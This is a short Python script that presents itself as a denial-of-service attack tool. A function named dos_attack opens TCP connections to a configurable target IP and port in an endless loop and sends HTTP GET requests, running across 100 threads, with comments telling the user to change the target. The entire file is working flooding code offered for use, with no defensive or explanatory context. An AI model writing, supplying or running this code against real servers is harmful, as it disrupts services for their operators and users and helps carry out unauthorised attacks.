import socket
import threading

TARGET_IP = '127.0.0.1'  # Change to target IP
TARGET_PORT = 80         # Change to target port
NUM_THREADS = 100        # Number of concurrent threads

def dos_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.sendto(b"GET / HTTP/1.1\r\nHost: " + bytes(TARGET_IP, 'utf-8') + b"\r\n\r\n", (TARGET_IP, TARGET_PORT))
            s.close()
        except Exception:
            pass

threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=dos_attack)
    t.daemon = True
    threads.append(t)
    t.start()

for t in threads:
    t.join()